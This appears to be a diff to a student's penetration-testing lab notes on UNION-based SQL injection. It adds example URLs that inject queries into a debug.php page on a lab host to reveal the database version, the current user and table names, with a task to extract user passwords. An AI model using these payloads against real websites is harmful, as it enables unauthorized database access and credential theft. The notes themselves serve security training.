@@ -137,9 +137,15 @@ We can enumerate the number of columns through trial and error via `union select
 ![[Pasted image 20220620165813.png]]
 Once we understand the number of columns we are able to work with we can begin enumerating different aspects of the databse. For example:
 version information
-`http://192.168.157.10/debug.php?id=1%20union%20all%20select%201,%202,%20@@version`
+`http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version`
+current user
+`http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()`
+or a list of tables
+`http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables`
+
+
 
 2.  Understand how and why you can pull data from your injected commands and have it displayed on the screen.
-
+The reason our malicious queries are being displayed on the screen has to do with the alignment of columns. By injecting 
 
 3.  Extract all users and associated passwords from the database.
